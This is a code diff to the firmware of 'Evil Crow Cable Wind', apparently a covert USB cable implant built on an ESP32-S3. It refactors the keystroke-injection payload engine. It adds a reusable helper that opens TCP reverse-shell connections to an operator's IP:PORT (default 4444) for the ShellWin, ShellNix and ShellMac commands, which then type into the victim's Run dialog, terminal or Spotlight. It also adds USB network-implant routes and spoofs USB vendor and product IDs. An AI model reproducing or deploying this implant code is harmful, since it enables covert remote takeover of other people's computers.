@@ -5,8 +5,7 @@
 #include <WebServer.h>
 #include <LittleFS.h>
 #include <HTTPUpdateServer.h>
-#include "USB.h"
-#include "USBHIDKeyboard.h"
+#include "EvilCrowLib.h"
 #include "index.h"
 #include "livepayload.h"
 #include "uploadpayload.h"
@@ -19,6 +18,9 @@
 #include <ArduinoJson.h>
 #include <husarnet.h>
 #include <map>
+#include "ecc_usb_network_implant.h"
+#include "ecc_usb_serial.h"
+#include "ecc_sapsan_ai.h"
 
 // Config default SSID, password and channel
 String ssid = "Evil Crow Cable Wind";  // Enter your SSID here
@@ -64,8 +66,13 @@ WebServer controlserver(80);
 WiFiServer tcpServer(12345);
 WiFiClient clientServer;
 HTTPUpdateServer httpUpdater;
-USBCDC USBSerial;
-USBHIDKeyboard Keyboard;
+
+#define ECC_LOG(x)   eccUsbSerialLog(String(x))
+
+String g_usbManufacturer = "Generic";
+String g_usbProduct      = "Evil Crow Cable Wind";
+uint16_t g_usbVid = 0x303A;
+uint16_t g_usbPid = 0x1001;
 
 enum HostOS {
   OS_UNKNOWN,
@@ -84,25 +91,6 @@ enum MetadataField {
 };
 
 HostOS detected_os = OS_UNKNOWN;
-
-extern const unsigned char en_us[128];
-extern const unsigned char es_es[128];
-extern const unsigned char fr_fr[128];
-extern const unsigned char it_it[128];
-extern const unsigned char da_dk[128];
-extern const unsigned char de_de[128];
-extern const unsigned char hr_hr[128];
-extern const unsigned char hu_hu[128];
-extern const unsigned char pt_pt[128];
-extern const unsigned char pt_br[128];
-extern const unsigned char be_be[128];
-extern const unsigned char br_br[128];
-extern const unsigned char ca_ca[128];
-extern const unsigned char ca_fr[128];
-extern const unsigned char sk_sk[128];
-extern const unsigned char cz_cz[128];
-extern const unsigned char sv_se[128];
-extern const unsigned char si_si[128];
 
 std::map<String, const unsigned char *> layoutMapInit = {
   { "EN_US", en_us },
@@ -174,28 +162,22 @@ std::map<String, uint8_t> keyMap = {
   { "KEY_F12", KEY_F12 }
 };
 
-void usbEventCallback(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
-  if (event_base == ARDUINO_USB_HID_KEYBOARD_EVENTS) {
-    arduino_usb_hid_keyboard_event_data_t* data = (arduino_usb_hid_keyboard_event_data_t*)event_data;
+void onKeyboardLeds(ecl_keyboard_leds_t data) {
+  led_response_received = true;
+  led_event_count = led_event_count + 1;
+  led_event_time = millis();
 
-    if (event_id == ARDUINO_USB_HID_KEYBOARD_LED_EVENT) {
-      led_response_received = true;
-      led_event_count = led_event_count + 1;
-      led_event_time = millis();
+  caps_status = data.capslock != 0;
+  num_status = data.numlock != 0;
+  scroll_status = data.scrolllock != 0;
+  numlock_checked = true;
 
-      caps_status = data->capslock != 0;
-      num_status = data->numlock != 0;
-      scroll_status = data->scrolllock != 0;
-      numlock_checked = true;
-
-      if (caps_sent_time > 0 && caps_delay == 0)
-        caps_delay = led_event_time - caps_sent_time;
-      if (num_sent_time > 0 && num_delay == 0)
-        num_delay = led_event_time - num_sent_time;
-      if (scroll_sent_time > 0 && scroll_delay == 0)
-        scroll_delay = led_event_time - scroll_sent_time;
-    }
-  }
+  if (caps_sent_time > 0 && caps_delay == 0)
+    caps_delay = led_event_time - caps_sent_time;
+  if (num_sent_time > 0 && num_delay == 0)
+    num_delay = led_event_time - num_sent_time;
+  if (scroll_sent_time > 0 && scroll_delay == 0)
+    scroll_delay = led_event_time - scroll_sent_time;
 }
 
 void ensureNumLock() {
@@ -452,7 +434,6 @@ void readFile(fs::FS &fs, const String &path) {
   FileList.replace("{{payloadContent}}", payloadContent);
   FileList.replace("{{payloadDescription}}", payloadDescription);
 }
-
 
 // Helper function to save payload metadata
 void savePayloadMetadata(const String &filename, const String &name, const String &description, const String &os) {
@@ -724,6 +705,9 @@ void handleStats() {
 }
 
 void connectToWiFi() {
+
+  WiFi.mode(WIFI_STA);
+
   // Disconnect first if currently connected
   if (WiFi.status() == WL_CONNECTED) {
     WiFi.disconnect();
@@ -796,7 +780,7 @@ void connectToWiFi() {
 
 void initVPN() {
   if (!LittleFS.exists("/vpn_config.txt")) {
-    USBSerial.println("No vpn_config.txt found, skipping VPN");
+    ECC_LOG("No vpn_config.txt found, skipping VPN");
     return;
   }
 
@@ -811,16 +795,16 @@ void initVPN() {
   }
 
   if (joincode.isEmpty()) {
-    USBSerial.println("VPN joincode empty, skipping VPN");
+    ECC_LOG("VPN joincode empty, skipping VPN");
     return;
   }
 
   husarnet.join("vpn-cable-wind", joincode.c_str());
   while (!husarnet.isJoined()) {
-    USBSerial.println("Waiting for Husarnet network...");
+    ECC_LOG("Waiting for Husarnet network...");
     delay(1000);
   }
-  USBSerial.println("Husarnet network joined");
+  ECC_LOG("Husarnet network joined");
 }
 
 void initMDNS() {
@@ -836,7 +820,7 @@ void initMDNS() {
 
   MDNS.end();
   if (!MDNS.begin(hostname.c_str())) {
-    USBSerial.println("Error setting up MDNS responder!");
+    ECC_LOG("Error setting up MDNS responder!");
   }
 
   tcpServer.begin();
@@ -943,6 +927,45 @@ void saveLayoutConfig(const String &layout) {
   fsUploadFile.close();
 }
 
+String g_lastShellStatus = "No connection attempted yet";
+
+static bool eccShellConnect(const String& target) {
+  if (clientServer.connected()) {
+    clientServer.stop();
+    delay(100);
+  }
+
+  String spec = target;
+  spec.trim();                 // a trailing space made the host unresolvable
+
+  String ip = spec;
+  int port = 4444;             // default when only an address is given
+  const int colonPos = spec.lastIndexOf(':');
+  if (colonPos >= 0) {
+    ip = spec.substring(0, colonPos);
+    port = spec.substring(colonPos + 1).toInt();
+  }
+  ip.trim();
+
+  if (ip.length() == 0 || port <= 0 || port > 65535) {
+    g_lastShellStatus = "Invalid target \"" + spec + "\" - expected IP or IP:PORT";
+    return false;
+  }
+
+  const unsigned long startTime = millis();
+  while (millis() - startTime < 5000) {
+    if (clientServer.connect(ip.c_str(), (uint16_t)port, 2000)) {
+      g_lastShellStatus = "Connected to " + ip + ":" + String(port);
+      return true;
+    }
+    delay(100);
+  }
+
+  g_lastShellStatus = "Could not connect to " + ip + ":" + String(port) +
+                      " - no listener, wrong address or blocked";
+  return false;
+}
+
 void payloadExec() {
   cmd.trim();
   // Skip empty lines and comments
@@ -992,34 +1015,7 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ShellWin ")) {
-    if (clientServer.connected()) {
-        clientServer.stop();
-        delay(100);
-    }
-
-    String connectionString = cmd.substring(9);
-    String ip;
-    int port;
-
-    // Parse IP:PORT or use default 4444
-    int colonPos = connectionString.indexOf(':');
-    if (colonPos == -1) {
-        ip = connectionString;
-        port = 4444; // Default port
-    } else {
-        ip = connectionString.substring(0, colonPos);
-        port = connectionString.substring(colonPos + 1).toInt();
-    }
-
-    // Connect with 5 second timeout
-    unsigned long startTime = millis();
-    bool connected = false;
-    while (!(connected = clientServer.connect(ip.c_str(), port))) {
-        if (millis() - startTime >= 5000) {
-            return;
-        }
-        delay(100);
-    }
+    if (!eccShellConnect(cmd.substring(9))) return;
 
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.print("r");
@@ -1036,52 +1032,17 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ShellNix ")) {
-    if (clientServer.connected()) {
-        clientServer.stop();
-        delay(100);
-    }
+    if (!eccShellConnect(cmd.substring(9))) return;
+    String deviceName = g_usbProduct;
+    deviceName.trim();
+    if (deviceName.length() == 0) deviceName = "Evil Crow Cable Wind";
 
-    String connectionString = cmd.substring(9);
-    String ip;
-    int port;
-
-    // Parse IP:PORT or use default 4444
-    int colonPos = connectionString.indexOf(':');
-    if (colonPos == -1) {
-        ip = connectionString;
-        port = 4444; // Default port
-    } else {
-        ip = connectionString.substring(0, colonPos);
-        port = connectionString.substring(colonPos + 1).toInt();
-    }
-
-    // Connect with 5 second timeout
-    unsigned long startTime = millis();
-    bool connected = false;
-    while (!(connected = clientServer.connect(ip.c_str(), port))) {
-        if (millis() - startTime >= 5000) {
-            return;
-        }
-        delay(100);
-    }
-    // Default device name
-    String deviceName = "Espressif_Systems_ESP32S3";
-    // Check if USB config exists and get product name
-    if (LittleFS.exists("/usb_config.txt")) {
-        File usbConfig = LittleFS.open("/usb_config.txt", FILE_READ);
-        if (usbConfig) {
-            // Read productName
-            usbConfig.readStringUntil('\n');
-            usbConfig.readStringUntil('\n');
-            String productName = usbConfig.readStringUntil('\n');
-            productName.trim();
-            if (productName.length() > 0) {
-                // Replace spaces with underscores
-                productName.replace(" ", "_");
-                deviceName = productName;
-            }
-            usbConfig.close();
-        }
+    deviceName.replace(" ", "_");
+    for (unsigned int i = 0; i < deviceName.length(); ++i) {
+        const char c = deviceName[i];
+        const bool safe = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
+                          (c >= '0' && c <= '9') || c == '_' || c == '.' || c == '-';
+        if (!safe) deviceName.setCharAt(i, '*');
     }
 
     Keyboard.press(KEY_LEFT_CTRL);
@@ -1094,65 +1055,11 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ServerConnect ")) {
-    if (clientServer.connected()) {
-        clientServer.stop();
-        delay(100);
-    }
-
-    String connectionString = cmd.substring(14);
-    String ip;
-    int port;
-
-    // Parse IP:PORT or use default 4444
-    int colonPos = connectionString.indexOf(':');
-    if (colonPos == -1) {
-        ip = connectionString;
-        port = 4444; // Default port
-    } else {
-        ip = connectionString.substring(0, colonPos);
-        port = connectionString.substring(colonPos + 1).toInt();
-    }
-
-    // Connect with 5 second timeout
-    unsigned long startTime = millis();
-    bool connected = false;
-    while (!(connected = clientServer.connect(ip.c_str(), port))) {
-        if (millis() - startTime >= 5000) {
-            return;
-        }
-        delay(100);
-    }
+    if (!eccShellConnect(cmd.substring(14))) return;
   }
   
   else if (cmd.startsWith("ShellMac ")) {
-    if (clientServer.connected()) {
-        clientServer.stop();
-        delay(100);
-    }
-
-    String connectionString = cmd.substring(9);
-    String ip;
-    int port;
-
-    // Parse IP:PORT or use default 4444
-    int colonPos = connectionString.indexOf(':');
-    if (colonPos == -1) {
-        ip = connectionString;
-        port = 4444; // Default port
-    } else {
-        ip = connectionString.substring(0, colonPos);
-        port = connectionString.substring(colonPos + 1).toInt();
-    }
-
-    // Connect with 5 second timeout
-    unsigned long startTime = millis();
-    bool connected = false;
-    while (!(connected = clientServer.connect(ip.c_str(), port))) {
-        if (millis() - startTime >= 5000) {
-            return;
-        }
-        delay(100);
-    }
+    if (!eccShellConnect(cmd.substring(9))) return;
 
     // run spotlight/alfred prompt
     Keyboard.press(KEY_LEFT_GUI);
@@ -1272,13 +1179,11 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("PrintLine ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    Keyboard.println(Command + 10);
+    Keyboard.println(cmd.c_str() + 10);
   }
 
   else if (cmd.startsWith("WinPrintLine ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    writeLineWindows(Command + 13);
+    writeLineWindows(cmd.c_str() + 13);
     delay(10);
     Keyboard.press(KEY_RETURN);
     delay(100);
@@ -1286,13 +1191,11 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("Print ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    Keyboard.print(Command + 6);
+    Keyboard.print(cmd.c_str() + 6);
   }
 
   else if (cmd.startsWith("WinPrint ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    writeLineWindows(Command + 9);
+    writeLineWindows(cmd.c_str() + 9);
   }
 
   else if (cmd.startsWith("Press ")) {
@@ -1589,10 +1492,6 @@ void handleDeleteAllPayloads() {
 }
 
 void setup() {
-  USB.onEvent(usbEventCallback);
-  Keyboard.onEvent(usbEventCallback);
-  USBSerial.onEvent(usbEventCallback);
-
   if (!LittleFS.begin(true)) {
     // format in case of missing file system
     LittleFS.format();
@@ -1600,28 +1499,35 @@ void setup() {
     ESP.restart();
   }
 
+  eccSapsanBegin();
+
   if (LittleFS.exists("/usb_config.txt")) {
     File fsUploadFile = LittleFS.open("/usb_config.txt", FILE_READ);
     if (fsUploadFile) {
-      String vendorID = fsUploadFile.readStringUntil('\n');
-      vendorID.trim();
-      String productID = fsUploadFile.readStringUntil('\n');
-      productID.trim();
-      String productName = fsUploadFile.readStringUntil('\n');
-      productName.trim();
-      String manufacturerName = fsUploadFile.readStringUntil('\n');
-      manufacturerName.trim();
+      String vendorID = fsUploadFile.readStringUntil('\n');       vendorID.trim();
+      String productID = fsUploadFile.readStringUntil('\n');      productID.trim();
+      String productName = fsUploadFile.readStringUntil('\n');    productName.trim();
+      String manufacturerName = fsUploadFile.readStringUntil('\n'); manufacturerName.trim();
       fsUploadFile.close();
-      USB.VID(strtol(vendorID.c_str(), nullptr, 16));
-      USB.PID(strtol(productID.c_str(), nullptr, 16));
-      USB.manufacturerName(manufacturerName.c_str());
-      USB.productName(productName.c_str());
+      if (vendorID.length())  g_usbVid = (uint16_t) strtol(vendorID.c_str(), nullptr, 16);
+      if (productID.length()) g_usbPid = (uint16_t) strtol(productID.c_str(), nullptr, 16);
+      if (productName.length())      g_usbProduct      = productName;
+      if (manufacturerName.length()) g_usbManufacturer = manufacturerName;
     }
   }
 
-  USB.begin();
+  EclUsbConfig ucfg;
+  ucfg.vid          = g_usbVid;
+  ucfg.pid          = g_usbPid;
+  ucfg.manufacturer = g_usbManufacturer.c_str();
+  ucfg.product      = g_usbProduct.c_str();
+  Usb.setConfig(ucfg);
+
+  Keyboard.onLedReport(onKeyboardLeds);
   Keyboard.begin();
-  USBSerial.begin();
+  eccUsbNetBegin();
+  eccUsbSerialBegin();
+  Usb.begin();
 
   if (LittleFS.exists("/layout_config.txt")) {
     File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
@@ -1650,6 +1556,7 @@ void setup() {
 
   connectToWiFi();
   initVPN();
+  eccUsbNetApplyRuntime();
 
   {
     File root = LittleFS.open("/payloads/");
@@ -1972,14 +1879,26 @@ void setup() {
   controlserver.on("/deletebackupwificonfig", HTTP_POST, handleDeleteBackupWiFiConfig);
   controlserver.on("/updatepayload", HTTP_POST, handleUpdatePayload);
   controlserver.on("/payloadcounter", handlePayloadCounter);
+  controlserver.on("/usb-network-implant/status", handleUsbNetworkImplantStatus);
+  controlserver.on("/usb-network-implant", HTTP_POST, handleUsbNetworkImplantSet);
 
+  eccUsbSerialRegisterRoutes();
+
+  controlserver.on("/shell/status", []() {
+    String json = "{\"status\":\"" + eccImplantJsonEscape(g_lastShellStatus) + "\"";
+    json += ",\"connected\":" + String(clientServer.connected() ? "true" : "false") + "}";
+    controlserver.sendHeader("Cache-Control", "no-store");
+    controlserver.send(200, "application/json", json);
+  });
+
+  eccSapsanRegisterRoutes();
   httpUpdater.setup(&controlserver);
   controlserver.begin();
 }
 
 void loop() {
   controlserver.handleClient();
-  delay(10);
+  eccUsbNetTask();
   vTaskDelay(1);
 
   // Check if we should auto-execute a payload
@@ -2070,14 +1989,7 @@ void loop() {
     }
   }
 
-  while (USBSerial.available()) {
-    String data = USBSerial.readString();
-    clientServer.print(data);
-  }
-  while (clientServer.available()) {
-    String data = clientServer.readString();
-    USBSerial.print(data);
-  }
+  eccUsbSerialTask();
   if (payload_state == 1) {
     // Set layout before executing payload
     setLayoutFromPayload(livepayload);
